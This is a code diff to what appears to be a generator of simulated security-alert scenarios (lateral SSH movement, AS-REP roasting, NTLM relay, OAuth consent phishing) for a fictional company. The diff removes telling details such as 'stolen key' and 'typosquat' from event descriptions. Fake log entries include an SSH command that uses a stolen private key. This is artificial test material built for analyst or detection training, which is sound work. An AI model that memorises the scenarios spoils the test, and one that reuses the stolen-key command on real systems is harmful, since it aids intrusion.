       severity: "high", mitre_technique: "T1021.004",
-      description: "netpulse-telemetry-svc opened an SSH connection from prod-srv-01 to db-primary.internal using the stolen id_rsa private key, then to jenkins.internal — no password prompt.",
+      description: "netpulse-telemetry-svc opened SSH connections from prod-srv-01 to db-primary.internal and jenkins.internal using public-key authentication.",
       process: { name: "ssh", pid: 14950, path: "/usr/bin/ssh",
         parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
         cmdline: "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
@@ -7589,7 +7589,7 @@ export function buildMfaFatigueScenario(scenarioId = "mfa-fatigue-ato"): Scenari
       source: "o365", vendor: "Microsoft 365 Unified Audit Log",
       event_type: "sharepoint_download", severity: "high", mitre_technique: "T1530",
       hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
-      description: "847 files (2.3GB) were downloaded from the Finance SharePoint site in 4 minutes — 650x j.chen's normal daily download volume.",
+      description: "847 files (2.3GB) were downloaded from the Finance SharePoint site under j.chen's account in 4 minutes.",
       raw: {
         "data.office365.Operation": "FileDownloaded",
         "data.office365.UserId": "j.chen@nexacorp.com",
@@ -7837,7 +7837,7 @@ export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): Scena
       source: "ad", vendor: "Windows Security",
       event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
       hostname: "DC01", user_email: "svc-reports@nexacorp.com", src_ip: "10.0.1.45",
-      description: "A third PreAuthType=0, RC4-encrypted AS-REP was issued for svc-reports, 15 seconds after svc-monitoring — three roastable accounts identified from WS-DEV-09 in under a minute.",
+      description: "A third PreAuthType=0, RC4-encrypted AS-REP was issued for svc-reports, 15 seconds after svc-monitoring.",
       raw: {
         "event.code": "4768",
         "winlog.channel": "Security",
@@ -7900,7 +7900,7 @@ export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): Scena
       source: "ad", vendor: "Windows Security",
       event_type: "auth_success", severity: "high", mitre_technique: "T1078.002",
       hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
-      description: "svc-backup authenticated to SRV-FILE01 via a network logon (Type 3) originating from WS-DEV-09, 6 hours after the AS-REP ticket was captured.",
+      description: "svc-backup authenticated to SRV-FILE01 via a network logon (Type 3) originating from WS-DEV-09.",
       raw: {
         "event.code": "4624",
         "winlog.channel": "Security",
@@ -8155,7 +8155,7 @@ export function buildNtlmRelayScenario(scenarioId = "ntlm-relay-responder"): Sce
       source: "ad", vendor: "Windows Security",
       event_type: "auth_success", severity: "high", mitre_technique: "T1078",
       hostname: "SRV-FILE01", user_email: "l.nguyen@nexacorp.com", src_ip: "10.0.1.45",
-      description: "l.nguyen's account authenticated to SRV-FILE01 via a network logon (Type 3), but the source IP is WS-DEV-09 — not l.nguyen's own workstation, WS-FIN-03.",
+      description: "l.nguyen's account authenticated to SRV-FILE01 via a network logon (Type 3) sourced from WS-DEV-09.",
       raw: {
         "event.code": "4624",
         "winlog.channel": "Security",
@@ -8804,7 +8804,7 @@ export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-gr
       source: "ueba", vendor: "Microsoft Sentinel UEBA",
       event_type: "risk_score_change", severity: "critical", mitre_technique: "T1528",
       hostname: "sentinel.nexacorp.com", user_email: "j.chen@nexacorp.com",
-      description: "Microsoft Sentinel UEBA raised the Productivity Suite Pro service principal's risk score from 8 to 91, citing high-volume mailbox access, after-hours activity, new app registration, and inbox rule creation.",
+      description: "Microsoft Sentinel UEBA raised the Productivity Suite Pro service principal's risk score from 8 to 91.",
       raw: {
         "ueba.entity_type": "ServicePrincipal",
         "ueba.entity_id": APP_ID,
@@ -8822,7 +8822,7 @@ export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-gr
       source: "ad", vendor: "Microsoft Entra ID",
       event_type: "account_create", severity: "high", mitre_technique: "T1528",
       hostname: "aad.nexacorp.com",
-      description: "The Productivity Suite Pro app was registered in Entra ID with an unverified publisher and a redirect URI at productivty-suite.com — a typosquat of productivity-suite.com missing the letter i.",
+      description: "The Productivity Suite Pro app was registered in Entra ID with an unverified publisher and a redirect URI at productivty-suite.com.",
       raw: {
         "data.office365.Operation": "Add application.",
         "data.office365.AzureActiveDirectoryEventType": 1,
